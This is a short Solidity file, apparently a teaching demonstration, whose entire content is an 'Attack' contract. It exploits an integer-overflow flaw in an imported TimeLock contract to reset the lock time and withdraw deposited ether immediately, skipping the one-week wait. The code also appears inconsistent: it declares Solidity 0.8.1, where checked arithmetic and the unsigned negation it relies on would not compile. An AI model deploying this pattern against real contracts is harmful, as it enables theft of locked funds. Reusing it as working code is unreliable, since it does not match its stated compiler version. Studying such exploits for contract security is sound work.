//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.1;
import "./Overflow.sol";

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) public {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    //Allow to withdraw immediately and don't wait 1 week
    function attack() public payable {
        timeLock.deposit{value: msg.value}();

        timeLock.increaseLockTime(
            uint(-timeLock.lockTime(address(this)))
        );

        timeLock.withdraw();
    }
}